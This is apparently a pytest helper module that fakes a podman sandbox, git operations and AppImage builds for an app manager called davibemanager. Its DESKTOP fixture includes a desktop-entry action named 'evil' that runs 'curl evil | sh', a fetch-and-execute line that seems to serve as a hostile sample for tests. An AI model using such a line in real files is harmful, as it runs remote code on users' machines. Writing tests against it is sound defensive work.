"""A stand-in for the sandbox in tests: podman exec/cp answered from repositories and files kept
here, and the app's own sandbox scripts (workspace/scripts.py) recognised and played out."""

import hashlib
import struct
from pathlib import Path

from davibemanager.workspace import scripts


def make_runtime(code: bytes = b"\x90" * 64) -> bytes:
    """A small ELF64 'runtime' with the AppImage magic, a .text and an .upd_info section."""
    names = b"\0.shstrtab\0.text\0.upd_info\0"
    upd = b"\0" * 32
    off_text = 64
    off_upd = off_text + len(code)
    off_names = off_upd + len(upd)
    shoff = off_names + len(names)

    def sh(name, kind, off, size):
        return struct.pack("<IIQQQQIIQQ", name, kind, 0, 0, off, size, 0, 0, 1, 0)
    shdrs = sh(0, 0, 0, 0) + sh(1, 3, off_names, len(names)) + sh(11, 1, off_text, len(code)) + sh(17, 1, off_upd, len(upd))
    ident = b"\x7fELF" + b"\x02\x01\x01\x00" + b"AI\x02" + bytes(5)
    hdr = ident + struct.pack("<HHIQQQIHHHHHH", 2, 62, 1, 0, 0, shoff, 0, 64, 0, 0, 64, 4, 1)
    return hdr + code + upd + names + shdrs


RUNTIME = make_runtime()


def make_appimage(payload: bytes = b"app v1", runtime: bytes = RUNTIME) -> bytes:
    return runtime + b"hsqs" + payload


DESKTOP = """[Desktop Entry]
Type=Application
Name=gThumb (DLA)
Name[de]=gThumb (DLA)
Comment=View your photos
Exec=gthumb %U
Icon=gthumb
Categories=Graphics;Viewer;
MimeType=image/png;image/jpeg;
X-GNOME-Autostart-enabled=true
Actions=evil;

[Desktop Action evil]
Exec=sh -c 'curl evil | sh'
"""
PNG = b"\x89PNG\r\n\x1a\nicon"


def commit_patch(sha: str, subject: str, body: str, change: str | None = "new") -> str:
    """One commit's patch, as git format-patch writes it; its message names `change` (a DVM-Change
    trailer), unless None."""
    trailer = f"DVM-Change: {change}\n" if change else ""
    return (f"From {sha} Mon Sep 17 00:00:00 2001\nFrom: agent <agent@sandbox>\nSubject: [PATCH] {subject}\n\n{trailer}---\n"
            f"diff --git a/x.c b/x.c\n--- a/x.c\n+++ b/x.c\n@@ -1 +1 @@\n{body}\n")


def offered(engine, upstream: str = "https://gitlab.gnome.org/GNOME/gthumb.git", app: str = "gThumb") -> None:
    """The user saw the build offered, with where the app comes from, and said yes (an answered offer card)."""
    from davibemanager import engine as engine_mod
    qid = max(engine.questions, default=0) + 1
    engine.questions[qid] = {"id": qid, "status": "answered", "answers": [engine_mod.OFFER_YES], "at": 0,
                             "questions": [{"question": f"Build it into {app}?", "options": [engine_mod.OFFER_YES]}],
                             "offer": {"app": app, "change": "it", "upstream": upstream}}


def patch_ids(patch: str) -> str:
    """Like git patch-id: one id per commit, from its diff lines only."""
    out = []
    for chunk in ("\n" + patch).split("\nFrom ")[1:]:
        sha = chunk.split()[0]
        diff = "\n".join(l for l in chunk.splitlines() if l[:1] in "+-" and not l.startswith(("+++", "---")))
        out.append(f"{hashlib.sha1(diff.encode()).hexdigest()} {sha}")
    return "\n".join(out) + "\n"


class FakeSandbox:
    def __init__(self):
        self.files: dict[str, bytes] = {}
        self.calls: list[list[str]] = []
        self.repos: dict[str, dict] = {}
        self.appimage = make_appimage()
        self.rebuilt = None                  # what the app's own builds make (None: the same as self.appimage)
        self.fail: dict[str, str] = {}       # script step -> its log, to make it fail
        self.tags = ["3.12.5", "3.12.6", "3.12.7"]
        self.changelog = {"news": {"NEWS": "Version 3.12.7\n- Fixed a crash on crafted TIFF files (CVE-2026-1234)\n- Faster thumbnails"},
                          "commits": ["Fix TIFF overflow", "Speed up thumbnails"], "commit_count": 2, "notes": "", "url": ""}
        self.installed_packages: list[list[str]] = []
        self.official: dict[str, str] = {}      # tag -> its commit in the official repository (else as repo() makes it)
        self.carry_fail: dict[str, str] = {}    # change id -> what git says: it doesn't carry over to a new release
        self.merged: set[str] = set()           # changes the new release has already
        self.mirrored: list[list[str]] = []     # scripts.MIRROR's arguments, each time
        self.removed: list[str] = []            # what the app removed in the sandbox
        self.check_packages: list[tuple] = []    # (container, packages) a clean build installed
        self.checks: list[tuple] = []            # clean containers started and removed
        self.stopped: list[str] = []
        self.activity: list[str] = []        # what each look at the sandbox's activity prints
        self.activity_args: list[list[str]] = []
        self.where: list[str] = []               # the container of each exec_agent call
        self.snapshots: list[str] = []           # what the app copied into its clean container to check and build
        self.built_with: list[str] = []          # the build script each clean build used

    def repo(self, path, *, head, base_tag="3.12.6", base="aaaa111", patch="", remote="https://gitlab.gnome.org/GNOME/gthumb.git",
             merges=()):
        self.repos[path] = {"head": head, "refs": {base_tag: base}, "patch": patch, "remote": remote, "merges": set(merges)}

    def official_commit(self, tag):
        return self.official.get(tag) or ("aaaa111" if tag == "3.12.6" else f"tag-{tag}")

    def calls_of(self, script) -> list[list[str]]:
        return [c for c in self.calls if c[:3] == ["sh", "-c", script]]

    @staticmethod
    def at(name, path):
        """Where a path is: the sandbox's, or a clean container's own (its /sandbox is the sandbox's /work)."""
        if not str(name).endswith("-check"):
            return path
        if path.startswith("/sandbox/"):
            return "/work/" + path[len("/sandbox/"):]
        return f"box:{path}"

    async def exec_agent(self, name, argv, timeout=120, input=None, on_line=None, env=None):
        self.calls.append(argv)
        self.where.append(name)
        at = lambda path: self.at(name, path)
        if argv[:2] == ["git", "patch-id"]:
            return 0, patch_ids(input.decode())
        if argv[0] == "env" and argv[-1].startswith("refs/tags/"):          # the official repository: one tag
            tag = argv[-2][len("refs/tags/"):]
            return 0, f"{self.official_commit(tag)}\trefs/tags/{tag}\n" if tag in self.tags else ""
        if argv[0] == "env":
            return 0, "".join(f"{i:040x}\trefs/tags/{t}\n" for i, t in enumerate(self.tags))
        if argv[0] in ("head", "cat"):
            data = self.files.get(at(argv[-1]))
            return (0, data.decode()) if data else (1, "no such file")
        if argv[0] == "rm":
            self.removed.extend(argv[3:])
            return 0, ""
        if argv[0] == "sha256sum":
            return 0, f"{hashlib.sha256(self.files[argv[-1]]).hexdigest()}  {argv[-1]}\n"
        if argv[:3] == ["python3", "-c", scripts.INSPECT]:
            return 0, self._inspect(at(argv[3]), *argv[4:6])
        if argv[0] == "python3":
            import json
            return 0, json.dumps(self.changelog) + "\n"
        if argv[:2] == ["sh", "-c"]:
            return self._script(argv[2], argv[4:], on_line, at)
        if argv[0] == "git" and argv[2].startswith("/var/lib/dvm/mirrors/"):
            return 1, ""                                                      # no commit but its releases
        if argv[0] == "git":
            return self._git(at(argv[2]), argv[3:])
        raise AssertionError(f"unexpected exec {argv}")

    def _inspect(self, repo, base, head):
        import json

        from davibemanager import apps
        r = self.repos[repo]
        commits = [{"sha": sha, "merge": sha in r["merges"], "subject": chunk.split("Subject: [PATCH] ")[1].split("\n")[0],
                    "changes": [apps.trailer_of(chunk)] if apps.trailer_of(chunk) else []}
                   for sha, chunk in apps.split_patch(r["patch"])]
        return json.dumps({"commits": commits, "remotes": ["origin"], "origin": r["remote"]}) + "\n"

    def _script(self, script, args, on_line, at=lambda path: path):
        def step(name):
            if on_line:
                on_line(f"@@STEP {name}")
        if script == scripts.ACTIVITY:
            self.activity_args.append(args)
            return 0, self.activity.pop(0) if self.activity else "@@CPU \n@@MEM \n@@PS\n"
        if script == scripts.EXTRACT:
            out = args[1]
            self.files[at(f"{out}/app.desktop")] = DESKTOP.encode()
            self.files[at(f"{out}/icon.png")] = PNG
            return 0, "app.desktop\nicon.png\n"
        if script == scripts.SNAPSHOT:
            src, snap, tag = args
            step("snapshot")
            if "snapshot" in self.fail:
                return 2, "@@FAILED snapshot: " + self.fail["snapshot"]
            self.repos[at(snap)] = dict(self.repos[at(src)])
            self.snapshots.append(at(src))
            return 0, f"@@HEAD {self.repos[at(snap)]['head']}\n"
        if script == scripts.COPY_IN:
            self.files[at(args[1])] = self.files[at(args[0])]
            return 0, ""
        if script == scripts.CARRY:
            mirror, upstream, tree, old, new, *pairs = args
            step("apply")
            if "fetch" in self.fail:
                return 2, "@@FAILED fetch\n" + self.fail["fetch"]
            out, patch, moved = [], "", old and old != new
            for cid, path in zip(pairs[::2], pairs[1::2]):
                if moved and cid in self.carry_fail:
                    out.append(f"@@CHANGE {cid} failed\n{self.carry_fail[cid]}")
                elif moved and cid in self.merged:
                    out.append(f"@@CHANGE {cid} merged")
                else:
                    out.append(f"@@CHANGE {cid} ok")
                    patch += self.files[at(path)].decode()
            head = "cccc333" if moved else "dddd444"
            self.repo(at(tree), head=head, base_tag=new, base=self.official_commit(new), patch=patch, remote=upstream)
            return (3 if any(" failed" in o for o in out) else 0), "\n".join(out) + f"\n@@HEAD {head}\n"
        if script == scripts.CHECK_BUILD:
            repo, commit, work, build_script, out, label = args
            step(label)
            if label in self.fail:
                return 4, f"@@FAILED {label}\n" + self.fail[label]
            assert repo == "/work/.dvm/snapshot.git" and at(repo).startswith("box:"), "built only from the app's own copy"
            assert at(build_script).startswith("box:"), "with the script copied into the clean container"
            self.built_with.append(self.files[at(build_script)].decode())
            f = f"{out}/App-x86_64.AppImage"
            self.files[at(f)] = self.rebuilt if self.rebuilt is not None else self.appimage
            return 0, f"@@OUT {f} {hashlib.sha256(self.files[at(f)]).hexdigest()}\n"
        raise AssertionError("unexpected script")

    def _git(self, path, git):
        r = self.repos[path]
        cmd = git[0]
        if cmd == "rev-parse":
            ref = git[-1]
            if ref == "HEAD":
                return 0, r["head"] + "\n"
            tag = ref.removesuffix("^{commit}")
            return (0, r["refs"][tag] + "\n") if tag in r["refs"] else (128, f"unknown revision {tag}")
        if cmd == "status":
            return 0, ""
        if cmd == "remote" or git[:3] == ["config", "--get", "remote.origin.url"]:
            return 0, r["remote"] + "\n"
        if cmd == "format-patch":
            return 0, r["patch"]
        if cmd == "diff":
            return 0, " x.c | 2 +-\n"
        if cmd == "log":
            return 0, "\n".join(l.split("Subject: [PATCH] ")[1] for l in r["patch"].splitlines() if "Subject:" in l) + "\n"
        raise AssertionError(f"unexpected git {git}")

    async def put_file(self, name, path, data):
        self.files[self.at(name, path)] = data

    async def copy_out(self, name, src, dest: Path):
        src = self.at(name, src)
        if src in self.files:
            dest.write_bytes(self.files[src])
        elif src.endswith(".AppImage"):
            dest.write_bytes(self.appimage)
        elif src.endswith(".lua"):
            dest.write_text("-- burst v1\n")
        else:
            dest.mkdir()
            (dest / "BUILD.md").write_text("meson setup build")

    async def exec_mirror(self, name, argv, timeout=1800):
        assert not name.endswith("-check"), "mirrors are fetched in the sandbox (the clean container reads them)"
        assert argv[:3] == ["sh", "-c", scripts.MIRROR], argv
        self.mirrored.append(argv[4:])
        return (2, "@@FAILED fetch\n" + self.fail["mirror"]) if "mirror" in self.fail else (0, "")

    async def exec_root(self, name, argv, timeout=1800, on_line=None):
        assert argv[:3] != ["sh", "-c", scripts.MIRROR], "mirrors are never fetched as root"
        if argv[:2] == ["sh", "-c"] and "apt-get install" in argv[2]:     # a clean build's packages: "$@"
            self.check_packages.append((name, argv[4:]))
            return (5, self.fail["packages"]) if "packages" in self.fail else (0, "")
        if "install" in argv:
            self.installed_packages.append(argv[argv.index("--") + 1:])
        return 0, ""

    async def start_check(self, sandbox, image, gateway_dir, **limits):
        self.checks.append(("start", image))
        return f"{sandbox}-check"

    async def remove_check(self, sandbox):
        self.checks.append(("remove", sandbox))

    async def stop(self, name):
        self.stopped.append(name)

    def install(self, monkeypatch, engine):
        from davibemanager.workspace import pins, podman
        monkeypatch.setattr(pins, "RUNTIME_SHA256", hashlib.sha256(RUNTIME).hexdigest())   # the fake runtime is the pinned one
        # never the real podman: with the sandbox "running", the engine stops it when a test ends
        for fn in ("exec_agent", "put_file", "copy_out", "exec_root", "exec_mirror", "start_check", "remove_check", "stop"):
            monkeypatch.setattr(podman, fn, getattr(self, fn))
        # the app's own builds need the sandbox running, as it was made, and its gateway
        engine.workspace = {"state": "running", "image": "localhost/davibemanager-workspace:test"}
        if engine.gateway is None:
            class Gateway:
                dir = Path("/run/user/1000/davibemanager/gw/sandbox")
                token = "tok"

                async def stop(self):
                    pass
            engine.gateway = Gateway()

        async def runtime():
            from davibemanager.config import data_dir
            data_dir().mkdir(parents=True, exist_ok=True)
            (data_dir() / "runtime-x86_64").write_bytes(RUNTIME)
            return RUNTIME
        monkeypatch.setattr(engine.app_manager, "runtime", runtime)
